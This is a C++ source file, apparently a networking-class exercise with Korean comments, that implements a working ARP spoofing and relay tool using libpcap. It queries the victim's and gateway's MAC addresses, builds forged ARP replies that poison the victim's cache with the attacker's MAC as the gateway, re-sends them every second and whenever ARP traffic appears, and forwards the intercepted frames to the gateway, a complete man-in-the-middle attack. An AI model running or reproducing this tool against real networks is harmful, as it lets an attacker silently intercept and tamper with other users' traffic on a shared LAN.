#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>
#include <libnet.h>
#include <time.h>

//MAC주소 길이
#define MAC_ALEN 6
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

time_t time1 = time(NULL);

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

//my IP/MAC address
int GetInterfaceMacAddress(const char *ifname, Mac *mac_addr, Ip* ip_addr){
    struct ifreq ifr;
    int sockfd, ret;

    printf("Get interface(%s) MAC address\n", ifname);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        printf("Fail to get\n");
        return -1;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0){
        printf("Fail to get\n");
        close(sockfd);
        return -1;
    }
    memcpy((void*)mac_addr, ifr.ifr_hwaddr.sa_data, Mac::SIZE);

    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if (ret < 0){
        printf("Fail to get\n");
        close(sockfd);
        return -1;
    }
    char ipstr[40];
    //memcpy((void*)ip_addr, ifr.ifr_addr.sa_data, Ip::SIZE);
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
    *ip_addr = Ip(ipstr);

    printf("sucess get interface(%s) MAC/IP",ifname);
    close(sockfd);
    return 0;
}

void SendArp(pcap_t* handle, EthArpPacket* packet){
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void SendArpReq(pcap_t* handle, Mac MAC_ADD, Ip IP_ADD, Ip ip){
    EthArpPacket packet;
    //To get vicitm MAC address - arp request to victim
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(MAC_ADD);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(MAC_ADD); //my MAC_ADD
    packet.arp_.sip_ = htonl(IP_ADD); //my ip - any ip in here can get reply packet
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(ip);  //ip want to get MAC

    printf("Sending ArpRequest to get Source MAC..\n");
    //ARP request packet to victim
    SendArp(handle, &packet);
}

EthArpPacket GetArpReply(pcap_t* pcap, Mac MAC_ADD,Mac* MAC_GATEWAY, Ip s_ip, Ip t_ip){
    EthArpPacket packet;

    while (true) {
            struct pcap_pkthdr* header;
            libnet_ethernet_hdr *eth_hdr;

            const u_char* out_packet;

            int res = pcap_next_ex(pcap, &header, &out_packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            //hdr
            eth_hdr = (libnet_ethernet_hdr*)(out_packet);

            if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP){
                continue;
            }
            EthArpPacket *arp_packet = (EthArpPacket *)out_packet;

            //get arp request from victim
            if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == s_ip){
                printf("Source Mac Address Captured success\n");
                packet.arp_.tmac_ = arp_packet->arp_.smac();
                packet.eth_.dmac_ = arp_packet->arp_.smac();
                continue;
            }

            //get arp request from victim
            if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == t_ip){
                printf("Target Mac Address Captured success\n");
                *MAC_GATEWAY = arp_packet->arp_.smac();
                break;
            }
    }

    //make attack packet
    //destination mac is defined (victim mac)
    packet.eth_.smac_ = Mac(MAC_ADD); //fake my mac to gateway mac
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(MAC_ADD); //fake my mac to gateway mac
    packet.arp_.sip_ = htonl(t_ip); //target ip
    //target mac is defined
    packet.arp_.tip_ = htonl(s_ip);  //source ip

    printf("success making arp attack packet\n");
    return packet;
}

void ArpSpoofing(pcap_t* pcap, pcap_t* handle, EthArpPacket* attack_packet, Mac* MAC_GATEWAY){

    printf("Arp spoofing start...\n");
    //init attack
    SendArp(handle, attack_packet);

    //relay to gateway
    //if not ARP packet, than relay to gateway all
    //waiting for ARP reply packet from victim... to get vicitm MAC
    while (true) {

            time_t time2 = time(NULL);
            if (time2 - time1 >= 1){
                //attack packet to victim again
                printf("regularly attack.. time gap : %02ld\n", time2-time1);
                SendArp(handle, attack_packet);
                time1 = time2;
            }

            struct pcap_pkthdr* header;
            libnet_ethernet_hdr *eth_hdr;

            const u_char* out_packet;

            int res = pcap_next_ex(pcap, &header, &out_packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }

            //hdr
            eth_hdr = (libnet_ethernet_hdr*)(out_packet);

            //if get ARP packet from ???? than we attack again
            if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP){
                //attack packet to victim again
                SendArp(handle, attack_packet);
            }

           //make relay packetS
           memcpy(eth_hdr->ether_dhost, MAC_GATEWAY, ETHER_ADDR_LEN);

           printf("relay to gateway... ether type : 0x%04X\n", ntohs(eth_hdr->ether_type));
           //relay to gateway
           res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(eth_hdr), header->len);

           if (res != 0) {
               fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
           }
    }
}


int main(int argc, char* argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    Ip s_ip(argv[2]);
    Ip t_ip(argv[3]);

    EthArpPacket packet;
    EthArpPacket attack_packet;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    char errbuf_2[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);

    Mac MAC_GATEWAY;
    Mac MAC_ADD;
    Ip IP_ADD;

    //MAC_ADD , IP_ADD is my mac & ip
    GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);

    //Send ARP request to get victim MAC ADD
    SendArpReq(handle,MAC_ADD, IP_ADD, s_ip);

    //Send ARP request to get gateway MAC ADD
    SendArpReq(handle,MAC_ADD, IP_ADD, t_ip);

    //waiting for ARP reply packet from victim... to get vicitm MAC & make attack_packet
    attack_packet = GetArpReply(pcap, MAC_ADD, &MAC_GATEWAY, s_ip, t_ip);

    //attack packet
    ArpSpoofing(pcap, handle, &attack_packet, &MAC_GATEWAY);

    pcap_close(handle);
}
